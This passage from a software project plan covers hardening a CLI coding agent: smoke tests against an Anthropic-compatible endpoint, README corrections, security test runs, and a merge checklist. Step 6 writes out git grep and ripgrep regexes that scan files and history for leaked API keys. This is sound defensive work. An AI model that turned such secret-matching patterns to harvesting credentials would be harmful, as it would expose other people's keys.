git add tests/smoke/smoke-assertions.ts tests/smoke/anthropic-api.smoke.ts tests/unit/smoke/smoke-assertions.test.ts .env.example
git commit -m "test: strengthen the real API smoke gate"
```

- [ ] **Step 9: Run the real API gate locally**

Use a local shell in which `ANTHROPIC_API_KEY` has already been exported through a non-recorded terminal or an ignored secret loader. Verify only that it is nonempty, then set the non-secret endpoint and model values:

```bash
test -n "${ANTHROPIC_API_KEY:-}"
export ANTHROPIC_BASE_URL="https://api.deepseek.com/anthropic"
export MODEL_ID="deepseek-v4-flash"
npm run test:smoke
```

Expected terminal output matches this regular expression:

```text
^SMOKE model=deepseek-v4-flash text_turn=completed tool_turn=completed tool_calls=[1-9][0-9]* duration_ms=[1-9][0-9]* PASS$
```

If the result is SKIPPED or FAIL, leave the real-smoke requirement unchecked and stop before Task 6’s merge gate. Diagnose the concrete provider or compatibility failure; do not weaken the smoke assertions to obtain PASS.

---

### Task 6: Audit Documentation and Establish the v0.1 Baseline

**Files:**
- Modify: `README.md`
- Modify: `README.txt`
- Modify: `docs/PROJECT_REQUIREMENTS.md`
- Verify: `.gitignore`, `.env.example`, `package.json`, full repository history

**Interfaces:**
- Produces: truthful run and security documentation, current verification evidence, and a release-ready commit sequence.
- Release gates: focused security tests, full offline suite, typecheck, build, help-without-credentials, missing-config failure, real API PASS, secret scan, clean worktree.

- [ ] **Step 1: Correct README claims**

Update `README.md` and `README.txt` so they state all of the following exactly in substance:

- repository-local execution uses `npm start -- --workspace <path>`;
- `nju-agent` becomes available only after an explicit link/install step;
- `--help` does not require credentials;
- file tools enforce canonical workspace paths;
- `run_command` uses the workspace as `cwd`, a sanitized allowlisted environment, timeout, cancellation, and permission prompts, but is not an OS sandbox;
- project scripts approved by the user can still access files that the operating-system account can access;
- `TOOL_OUTPUT_MAX_BYTES` limits the result returned to the model and `UI_OUTPUT_MAX_BYTES` separately limits live terminal display;
- the real smoke command is opt-in and its recorded state is PASS only after an actual credentialed run;
- remove the hard-coded “114 tests” count and say “the full offline unit and integration suite” so future test additions do not stale the README;
- change “The recorded demo shows” to “The planned demo scenario shows” until the video exists.

- [ ] **Step 2: Correct requirement statuses and audit evidence**

In `docs/PROJECT_REQUIREMENTS.md`:

- mark the real DeepSeek text/tool smoke milestone complete only if Task 5 Step 9 printed PASS;
- replace the stale 114-test statement with the count from the fresh Task 6 Step 3 run, or omit the count and record the command plus PASS;
- document the new child-environment boundary and conservative command confirmation behavior;
- leave public repository, video, ZIP, form submission, deadline-dependent history, semantic summary, sessions, Skills, and other P2 items unchecked;
- do not mark the project’s final external delivery complete.

- [ ] **Step 3: Run every offline quality gate from a clean process**

Run in this order:

```bash
npm test
npm run typecheck
npm run build
node dist/index.js --help
```

Expected:

- every test file passes;
- typecheck exits 0 with no diagnostics;
- build exits 0;
- built help prints usage and exits 0 without reading credentials.

Then run the built CLI without required variables in a clean shell environment:

```bash
env -u ANTHROPIC_API_KEY -u ANTHROPIC_BASE_URL -u MODEL_ID node dist/index.js
```

Expected: concise missing-variable names, no values, and exit code 1.

- [ ] **Step 4: Run targeted security acceptance checks**

Run:

```bash
npm test -- tests/unit/security/command-environment.test.ts tests/unit/security/permission-policy.test.ts tests/unit/tools/command-tool.test.ts
```

Expected: all tests PASS. Confirm the tests explicitly cover credential removal, arbitrary `node`, single pipe, redirection, home expansion, command timeout, cancellation, and dangerous-command denial.

- [ ] **Step 5: Re-run the real API gate and record metadata only**

Run `npm run test:smoke` in the credentialed local shell used in Task 5. Expected: one metadata-only PASS line. Record in the requirement audit only:

- date;
- model ID;
- text-turn status;
- tool-turn status;
- positive tool-call count;
- latency;
- PASS.

Do not record response text, read-file content, headers, account identifiers, balance, or credential fragments.

- [ ] **Step 6: Scan tracked files and history for likely credentials**

Run:

```bash
git grep -nE 'sk-[A-Za-z0-9_-]{20,}|ANTHROPIC_API_KEY[[:space:]]*=[[:space:]]*[^r][^[:space:]]+'
git log -p --all -- . ':!package-lock.json' | rg -n 'sk-[A-Za-z0-9_-]{20,}|ANTHROPIC_API_KEY[[:space:]]*=[[:space:]]*[^r][^[:space:]]+'
```

Expected: no matches. The placeholder `replace-with-your-api-key` is allowed and should not match. If a real credential is found in history, stop, revoke it immediately, and discuss history remediation before any public push.

- [ ] **Step 7: Commit the truthful audit**

```bash
git add README.md README.txt docs/PROJECT_REQUIREMENTS.md
git commit -m "docs: close the stage-one release audit"
```

- [ ] **Step 8: Confirm the final branch state**

Run:

```bash
git status --short --branch
git log --oneline --decorate -10
git diff --check main...HEAD
```

Expected:

- no modified or untracked files;
- the six stage-one commits appear after the existing implementation history;
- `git diff --check` exits 0;
- no commits have been squashed, amended, or force-pushed.

- [ ] **Step 9: Merge only after all gates are green**

Use the project’s branch-finishing workflow. `main` is checked out in the repository’s primary worktree, so perform the merge there rather than trying to check out `main` inside the feature worktree. If `main` has not moved since the feature branch was created, prefer a local fast-forward merge so all incremental commits remain visible:

```bash
MAIN_ROOT=$(git -C "$(git rev-parse --git-common-dir)/.." rev-parse --show-toplevel)
git -C "$MAIN_ROOT" merge --ff-only fix/stage-one-hardening
npm --prefix "$MAIN_ROOT" ci
npm --prefix "$MAIN_ROOT" test
npm --prefix "$MAIN_ROOT" run typecheck
npm --prefix "$MAIN_ROOT" run build
```

Expected: fast-forward succeeds and all merged-result gates pass. If `main` has moved, stop and inspect the divergence; do not force, squash, or rewrite history. Create the second-stage branch only after the merged `main` is green.

## Definition of Done

Stage one is closed only when every statement below is true:

- Child commands cannot read `ANTHROPIC_API_KEY` or unrelated parent environment values through `process.env`.
- Balanced mode asks before arbitrary runtimes, compound shell syntax, redirection, home expansion, mutating search/edit commands, and destructive Git branch commands.
- The executable has a Node shebang; `--help` works without credentials; documented local run commands work.
- Non-TTY model text preserves token-fragment continuity, and live command output has its own per-call byte limit.
- Full offline tests, typecheck, and build pass.
- A real DeepSeek Anthropic-compatible text turn and `read_file` tool turn produce a metadata-only PASS.
- Documentation describes the command boundary honestly and contains no stale test count or nonexistent recorded-video claim.
- Credential scans find no real key in tracked files or history.
- The completed work is integrated without squashing or rewriting the incremental history.
